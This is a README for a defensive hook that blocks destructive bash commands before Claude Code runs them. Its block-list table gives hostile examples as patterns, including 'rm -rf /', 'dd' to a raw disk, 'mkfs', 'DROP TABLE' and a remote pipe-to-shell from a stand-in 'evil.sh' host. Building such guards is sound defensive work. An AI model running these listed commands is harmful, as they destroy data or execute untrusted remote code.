# Destructive Bash Command Guard (PreToolUse Hook)

Blocks destructive bash commands before Claude Code executes them. Follows the
[Claude Code hooks format](https://docs.anthropic.com/claude-code/hooks).

## Install (2 commands)

```bash
mkdir -p ~/.claude/hooks && cp PreToolUse.py ~/.claude/hooks/
echo '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"python3 ~/.claude/hooks/PreToolUse.py"}]}]}}' > ~/.claude/settings.json
```

## What it blocks

| Pattern | Example |
|---|---|
| `rm -rf` / recursive force delete | `rm -rf /`, `rm -rf ~/*` |
| Critical-path `rm` | `rm -rf /etc`, `rm -f /var/lib/*` |
| `DROP TABLE/DATABASE/SCHEMA` | `DROP TABLE users` |
| `TRUNCATE` | `TRUNCATE TABLE orders` |
| `DELETE FROM` **without** `WHERE` | `DELETE FROM users` (with WHERE: allowed) |
| `git push --force` | `git push origin main --force` |
| `git reset --hard` | `git reset --hard HEAD~5` |
| `dd` to raw disk device | `dd if=x of=/dev/sda` |
| Filesystem format | `mkfs.ext4 /dev/sdb1` |
| `chmod -R 777` on critical paths | `chmod -R 777 /etc` |
| Shutdown/reboot | `shutdown -h now`, `reboot` |
| Remote pipe-to-shell | `curl https://evil.sh | sh` |

## What it does not interfere with

Normal dev commands (`git status/log/diff`, `ls`, `cat`, `find`, `grep`, `npm test`,
`pip install`, ...) pass through untouched.

## Behavior on block

1. Writes a structured log entry to `~/.claude/hooks/blocked.log`:

```json
{"timestamp": "2026-08-17 11:45:00", "command": "rm -rf /tmp/x", "reason": "rm -rf / recursive force delete", "project_path": "/home/user/proj"}
```

2. Returns a clear `block` decision so Claude sees exactly why and what to do instead.

## Test

```bash
echo '{"tool_input":{"command":"rm -rf /tmp/foo"}}' | python3 PreToolUse.py   # -> block
echo '{"tool_input":{"command":"git status"}}' | python3 PreToolUse.py        # -> allow
echo '{"tool_input":{"command":"DELETE FROM users WHERE id=1"}}' | python3 PreToolUse.py  # -> allow
```
